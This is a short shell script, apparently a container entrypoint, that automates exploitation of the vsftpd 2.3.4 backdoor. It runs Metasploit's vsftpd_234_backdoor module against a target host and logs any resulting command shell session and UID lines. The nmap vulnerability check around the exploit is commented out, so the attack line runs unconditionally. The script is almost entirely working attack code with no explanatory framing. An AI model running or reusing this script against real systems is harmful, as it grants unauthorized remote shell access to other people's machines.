# echo "Checking if $TARGET is vulnerable to vsftp-backdoor"
# nmap --script ftp-vsftpd-backdoor $TARGET | grep 'VULNERABLE' &> /dev/null;
# if [ $? == 0 ]; then
   # echo "$TARGET:$PORT is vulnerable to vsftp-backdoor. Executing attack"
   echo 'exit' | msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost $TARGET; run" | grep -E 'Command shell session | UID: | Exploit completed' >> output.txt
   while read line; do
     arr=( "${arr[@]}" "$line" )
   done < output.txt

   echo ${arr[0]}
   echo ${arr[1]}
   echo ${arr[2]}
   echo ${arr[3]}
# else
#   echo "$TARGET is not vulnerable to vsftp-backdoor"
# fi

exec "$@"
